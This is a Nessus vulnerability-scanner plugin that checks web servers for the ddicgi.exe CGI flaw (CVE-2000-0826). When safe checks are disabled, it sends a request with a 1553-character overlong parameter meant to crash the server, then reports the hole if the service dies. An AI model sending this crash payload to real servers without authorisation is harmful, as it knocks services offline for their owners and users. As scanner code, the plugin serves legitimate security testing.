#
# This script was written by John Lampe...j_lampe@bellsouth.net 
#
# See the Nessus Scripts License for details
#



if(description)
{
 script_id(11728);
 script_bugtraq_id(1657);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2000-0826");
 
 
 name["english"] = "ddicgi.exe vulnerability";
 name["francais"] = "ddicgi.exe vulnerability";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The file ddicgi.exe exists on this webserver.  
Some versions of this file are vulnerable to remote exploit.

An attacker may use this file to gain access to confidential data
or escalate their privileges on the Web server.

Solution : remove it from the cgi-bin or scripts directory.

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the ddicgi.exe file";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 John Lampe",
		francais:"Ce script est Copyright (C) 2003 John Lampe");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(is_cgi_installed_ka(item:"/ddrint/bin/ddicgi.exe", port:port))
{
  if (safe_checks() == 0) {
	if(http_is_dead(port:port))exit(0);
	req = string("GET /ddrint/bin/ddicgi.exe?", crap(1553), "=X HTTP/1.0\r\n\r\n");
	soc = open_sock_tcp(port);
	if (soc) {
		send(socket:soc, data:req);
		r = http_recv(socket:soc);
		close(soc);
		if(http_is_dead(port:port)){ security_hole(port); exit(0); }
	}
	exit(0);
   }
}

